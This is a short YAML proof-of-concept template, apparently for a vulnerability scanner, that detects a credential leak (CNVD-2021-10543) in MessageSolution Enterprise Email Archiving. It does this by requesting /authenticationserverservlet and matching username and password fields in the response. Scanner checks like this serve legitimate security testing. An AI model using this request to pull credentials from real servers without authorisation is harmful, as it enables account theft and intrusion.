detail:
  author: Search?=Null
  description: MessageSolution Enterprise Email Archiving (EEA) Info Leak.
  links:
  - https://exp1orer.github.io
expression: r0()
manual: true
name: poc-yaml-eea-info-leak-cnvd-2021-10543
rules:
  r0:
    expression: response.status == 200 && "<username>(.*?)</username>".bmatches(response.body)
      && "<password>(.*?)</password>".bmatches(response.body)
    request:
      cache: true
      method: GET
      path: /authenticationserverservlet
transport: http
